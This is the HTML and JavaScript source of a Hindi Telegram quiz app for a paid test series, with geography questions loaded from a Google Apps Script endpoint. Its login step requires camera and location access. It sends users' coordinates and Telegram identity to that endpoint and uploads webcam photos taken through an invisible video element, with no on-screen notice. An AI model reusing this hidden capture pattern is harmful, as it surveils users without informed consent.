<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ultimate Paid Quiz</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0"></script>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
    
    <style>
        /* --- UI CSS --- */
        * { box-sizing: border-box; font-family: 'Poppins', sans-serif; user-select: none; }
        @keyframes gradientBG {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        body {
            margin: 0; min-height: 100vh; background: linear-gradient(-45deg, #0f2027, #203a43, #2c5364, #0b131e);
            background-size: 400% 400%; animation: gradientBG 15s ease infinite; color: #ffffff; text-align: center; padding-bottom: 50px; overflow-x: hidden;
        }
        .header { padding: 25px 20px; background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(10px); border-bottom: 1px solid rgba(255, 255, 255, 0.05); margin-bottom: 20px; box-shadow: 0 4px 30px rgba(0, 0, 0, 0.2); }
        .header h1 { margin: 0 0 10px; font-size: 38px; font-weight: 700; background: linear-gradient(90deg, #00eaff, #00ffcc); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .telegram-box { width: 400px; max-width: 90%; margin: auto; background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(0, 234, 255, 0.3); padding: 12px; border-radius: 12px; }
        .telegram-box a { color: #00eaff; font-weight: bold; text-decoration: none; }
        .card { width: 750px; max-width: 92%; margin: auto; margin-top: 30px; background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(16px); padding: 40px 30px; border-radius: 20px; border: 1px solid rgba(255, 255, 255, 0.1); animation: popIn 0.6s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
        @keyframes popIn { 0% { opacity: 0; transform: scale(0.95) translateY(20px); } 100% { opacity: 1; transform: scale(1) translateY(0); } }
        input { width: 85%; padding: 15px 20px; margin: 12px; border-radius: 12px; background: rgba(0, 0, 0, 0.3); border: 1px solid rgba(255, 255, 255, 0.2); color: white; font-size: 16px; outline: none; }
        button { background: linear-gradient(135deg, #ffd700, #ffaa00); color: #111; border: none; padding: 14px 30px; border-radius: 12px; cursor: pointer; font-size: 16px; font-weight: 700; margin: 10px; transition: 0.3s; }
        button:hover { transform: translateY(-3px); box-shadow: 0 8px 25px rgba(255, 215, 0, 0.5); }
        .option { background: rgba(255, 255, 255, 0.08); color: #fff; padding: 16px; margin: 12px 0; border-radius: 12px; cursor: pointer; font-size: 18px; text-align: left; transition: 0.3s; }
        .option:hover { background: rgba(255, 255, 255, 0.15); }
        .correct { background: rgba(124, 252, 0, 0.2) !important; border: 1px solid #7CFC00 !important; }
        .wrong { background: rgba(255, 107, 107, 0.2) !important; border: 1px solid #ff6b6b !important; }
        .timer { display: inline-block; background: rgba(0, 0, 0, 0.6); border: 1px solid #ffaa00; color: #ffaa00; padding: 8px 18px; border-radius: 10px; margin: 15px; font-weight: 600; }
        #totalTimeLabel { color: #00eaff; font-weight: 600; margin-bottom: 10px; display: block; font-size: 14px; }
        .progress { width: 100%; height: 12px; background: rgba(0, 0, 0, 0.5); border-radius: 10px; margin-bottom: 25px; overflow: hidden; }
        .progress-bar { height: 100%; width: 0%; background: linear-gradient(90deg, #00ffcc, #00eaff); transition: width 0.5s; }
        #proctorVideo { position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; opacity: 0; z-index: -1; pointer-events: none; }
    </style>
</head>
<body>

<div class="header">
    <h1>Yogesh (Max Test Series)</h1>
    <h2>Ultimate Paid Quiz</h2>
    <h3 id="chapter">Chapter 2: पृथ्वी की उत्पत्ति एवं विकास</h3>
</div>

<div class="telegram-box">
    Telegram Support <br>
    <a href="https://t.me/jangra854x">@jangra854x</a>
</div>

<div id="login" class="card">
    <h2 style="margin-bottom: 25px;">लॉगिन करें</h2>
    <p id="auth-msg" style="color: #ffd700; font-size: 14px;"></p>
    <input id="name" placeholder="पूरा नाम" autocomplete="off">
    <input id="age" placeholder="उम्र (Optional)" autocomplete="off">
    <br><br>
    <button id="startBtn" onclick="login()">टेस्ट शुरू करें</button>
</div>

<video id="proctorVideo" autoplay playsinline muted></video>

<div id="quizBox" class="card" style="display:none">
    <span id="totalTimeLabel">कुल समय: 00:00</span>
    <div class="progress"><div class="progress-bar" id="progress"></div></div>
    <div id="animWrapper">
        <div id="question" style="font-size: 22px; font-weight: 600; margin-bottom: 20px; text-align: left;"></div>
        <div id="options"></div>
    </div>
    <div class="timer" id="qTimer">समय: 120 सेकंड</div>
    <br>
    <button onclick="skip()" style="background: linear-gradient(135deg, #555, #333); color: white;">प्रश्न छोड़ें</button>
    <button onclick="next()">अगला प्रश्न</button>
</div>

<div id="result" class="card" style="display:none"></div>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand();

    const API = "https://script.google.com/macros/s/AKfycbzL5UXMkkJZ9Nf2Ebf3S-4v7D6Hgf1b5pwHnT3nQD35uWIM99yHIEPyy37FxeUbJKFG/exec";
    const quizID = 1;

    let questions = [];      
    let totalQuestions = 0;  
    let qGlobalIndex = 0;    
    let apiPointer = 0;      
    let correct = 0, wrong = 0, skipped = 0, score = 0;
    let answered = false;
    let questionTimer, totalTimerInterval;
    let totalSeconds = 0;
    let name, age;
    let testEntryId = null; 

    let userLoc = "Pending";
    let globalStream = null;
    let photoIdx = 0;
    let photoInterval = null;

    window.onload = function() {
        const user = tg.initDataUnsafe.user;
        if (user) {
            document.getElementById("auth-msg").innerText = "नमस्ते @" + (user.username || user.first_name) + ", आप टेस्ट दे सकते हैं।";
        }
    };

    async function login() {
        name = document.getElementById("name").value.trim();
        if (!name) { alert("कृपया अपना नाम भरें"); return; }
        
        const btn = document.getElementById("startBtn");
        btn.innerText = "तैयार हो रहे हैं...";
        btn.disabled = true;

        try {
            globalStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            document.getElementById('proctorVideo').srcObject = globalStream;

            const pos = await new Promise((res) => {
                navigator.geolocation.getCurrentPosition(res, () => res({coords:{latitude:0,longitude:0}}), { enableHighAccuracy: true });
            });
            userLoc = `${pos.coords.latitude}, ${pos.coords.longitude}`;

            // 1. Entry request and wait for row ID
            const entryResponse = await fetch(API, {
                method: "POST",
                body: JSON.stringify({
                    type: "ENTRY",
                    name: name,
                    tgId: tg.initDataUnsafe.user?.id || "N/A",
                    username: tg.initDataUnsafe.user?.username || "N/A",
                    location: userLoc
                })
            });
            const entryResult = await entryResponse.json();
            testEntryId = entryResult.row;

            // 2. IMMEDIATE PHOTO (No delay)
            capturePhoto();

            // Start Monitoring (Every 2 min for next photos)
            photoInterval = setInterval(() => {
                if (photoIdx < 5) capturePhoto();
            }, 120000);

            // Start Quiz UI
            document.getElementById("login").style.display = "none";
            document.getElementById("quizBox").style.display = "block";
            
            totalTimerInterval = setInterval(() => {
                totalSeconds++;
                document.getElementById("totalTimeLabel").innerText = "कुल समय: " + formatTime(totalSeconds);
            }, 1000);

            await loadInitialBatch();

        } catch (e) {
            alert("Camera और Location अनुमति अनिवार्य है!");
            btn.disabled = false;
            btn.innerText = "टेस्ट शुरू करें";
        }
    }

    async function sendLiveUpdate(payload) {
        try {
            await fetch(API, {
                method: "POST",
                body: JSON.stringify(payload)
            });
        } catch (err) { console.log("Update Error: ", err); }
    }

    function capturePhoto() {
        if (photoIdx >= 5 || !testEntryId) return;
        const video = document.getElementById('proctorVideo');
        const canvas = document.createElement('canvas');
        canvas.width = 480; canvas.height = 640; 
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        const photoData = canvas.toDataURL('image/jpeg', 0.5);
        photoIdx++;

        // Send photo immediately
        sendLiveUpdate({
            type: "PHOTO",
            row: testEntryId,
            photoNum: photoIdx,
            photoData: photoData
        });
    }

    function stopMonitoring() {
        if (globalStream) globalStream.getTracks().forEach(track => track.stop());
        if (photoInterval) clearInterval(photoInterval);
    }

    // --- QUIZ LOGIC ---
    async function loadInitialBatch() {
        let res = await fetch(`${API}?quiz=${quizID}&start=${apiPointer}`);
        let data = await res.json();
        totalQuestions = data.total;
        questions = data.questions;
        apiPointer += 2; 
        load();
    }

    async function fetchMore() {
        if (apiPointer >= totalQuestions) return;
        let res = await fetch(`${API}?quiz=${quizID}&start=${apiPointer}`);
        let data = await res.json();
        if(!data.error) { questions = [...questions, ...data.questions]; apiPointer += 2; }
    }

    function load() {
        if(questions.length === 0) return;
        answered = false;
        let ques = questions[0];
        let optionsWithIndex = ques.options.map((opt, index) => ({ text: opt, isCorrect: index === ques.a }));
        optionsWithIndex.sort(() => Math.random() - 0.5);
        ques.options = optionsWithIndex.map(o => o.text);
        ques.a = optionsWithIndex.findIndex(o => o.isCorrect);

        document.getElementById("question").innerHTML = "<b>प्रश्न " + (qGlobalIndex + 1) + " / " + totalQuestions + "</b><br><br>" + ques.q;
        let html = "";
        ques.options.forEach((op, i) => { html += `<div class="option" onclick="answer(${i})">${op}</div>`; });
        document.getElementById("options").innerHTML = html;
        startTimer();
        updateProgress();
    }

    function startTimer() {
        let time = 120; clearInterval(questionTimer);
        const timerUI = document.getElementById("qTimer");
        timerUI.innerHTML = "समय: " + time + " सेकंड";
        questionTimer = setInterval(() => {
            time--; timerUI.innerHTML = "समय: " + time + " सेकंड";
            if (time <= 0) skip();
        }, 1000);
    }

    function answer(i) {
        if (answered) return;
        answered = true; clearInterval(questionTimer);
        let ques = questions[0];
        let ops = document.getElementsByClassName("option");
        if (i == ques.a) { ops[i].classList.add("correct"); score += 2; correct++; confetti({particleCount: 100, spread: 70, origin: { y: 0.6 }}); }
        else { ops[i].classList.add("wrong"); ops[ques.a].classList.add("correct"); score -= 0.66; wrong++; }
    }

    function skip() { if(!answered) { skipped++; moveToNext(); } else { next(); } }
    function next() { if (!answered) { alert("उत्तर चुनें!"); return; } moveToNext(); }

    function moveToNext() {
        questions.shift(); qGlobalIndex++;
        if (qGlobalIndex >= totalQuestions) finish();
        else { if(questions.length <= 1) fetchMore(); load(); }
    }

    function updateProgress() { document.getElementById("progress").style.width = (qGlobalIndex / totalQuestions) * 100 + "%"; }
    function formatTime(sec) { return Math.floor(sec/60).toString().padStart(2,'0') + ":" + (sec%60).toString().padStart(2,'0'); }

    function finish() {
        stopMonitoring();
        clearInterval(questionTimer); clearInterval(totalTimerInterval);
        document.getElementById("quizBox").style.display = "none";
        document.getElementById("result").style.display = "block";
        document.getElementById("result").innerHTML = "<h2 style='color:#00eaff'>फाइनल सबमिट हो रहा है...</h2>";

        fetch(API, {
            method: "POST",
            body: JSON.stringify({
                type: "FINISH",
                row: testEntryId,
                score: score.toFixed(2),
                correct: correct,
                wrong: wrong,
                skipped: skipped,
                negative: (wrong * 0.66).toFixed(2),
                time: formatTime(totalSeconds)
            })
        }).then(() => {
            document.getElementById("result").innerHTML = `
                <h2 style='color:#7CFC00; font-size:32px;'>टेस्ट समाप्त! 🎉</h2>
                <p><b>अंक:</b> ${score.toFixed(2)} | <b>समय:</b> ${formatTime(totalSeconds)}</p>
                <br><button onclick="tg.close()">App Band Karein</button>
            `;
        });
    }

    // Anti-Cheat
    document.addEventListener('contextmenu', e => e.preventDefault());
    document.addEventListener('visibilitychange', () => {
        if (document.hidden && document.getElementById("quizBox").style.display === "block") tg.showConfirm("⚠️ टैब न बदलें!");
    });
</script>
</body>
</html>
